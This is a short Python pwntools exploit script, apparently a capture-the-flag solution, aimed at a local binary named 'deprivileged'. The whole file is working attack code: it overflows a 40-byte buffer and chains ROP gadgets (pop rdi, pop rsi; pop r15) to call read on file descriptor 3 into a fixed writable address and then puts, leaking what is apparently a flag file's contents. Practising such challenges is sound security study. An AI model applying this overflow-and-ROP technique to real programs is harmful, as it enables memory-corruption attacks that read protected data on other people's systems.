#!/usr/bin/python

from pwn import *
import os

p = process('./deprivileged')

'''
0x0000000000400a63 : pop rdi ; ret
0x0000000000400a61 : pop rsi ; pop r15 ; ret
0x00000000004006a0  puts@plt
0x00000000004006d0  read@plt
'''
pop_rdi_ret = 0x400a63
pop_rsi_r15_ret = 0x400a61

read_plt = 0x4006d0
puts_plt = 0x4006a0
store_addr = 0x601800
flag_addr = 0x40096b

payload = ''
payload += 'A' * 32 + 'BBBBBBBB'

payload += p64(pop_rdi_ret)
payload += p64(3)
payload += p64(pop_rsi_r15_ret)
payload += p64(store_addr)
payload += p64(0)
payload += p64(read_plt)

payload += p64(pop_rdi_ret)
payload += p64(store_addr)
payload += p64(puts_plt)

p.sendline(payload)

p.interactive()
